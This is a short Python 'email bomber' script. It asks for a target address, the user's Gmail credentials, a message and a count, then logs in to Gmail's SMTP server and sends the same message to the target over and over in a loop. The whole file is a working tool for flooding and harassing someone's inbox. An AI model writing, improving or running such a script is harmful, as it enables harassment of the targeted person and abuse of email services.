import smtplib

email_to_bomb_on = input("Enter the email to bomb on: ")
your_email_address = input("Enter your Gmail Address: ")
password = input("Enter your password: ")
msg = input("Enter the message to send: ")
number_of_mails_to_bomb = int(input("Numbers of mails to Bomb: "))
print("Please wait for some time for the mails to send.")

for mail in range(0,number_of_mails_to_bomb):
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(your_email_address, password)
        smtp.sendmail(your_email_address, email_to_bomb_on, msg)
        print("Sent")
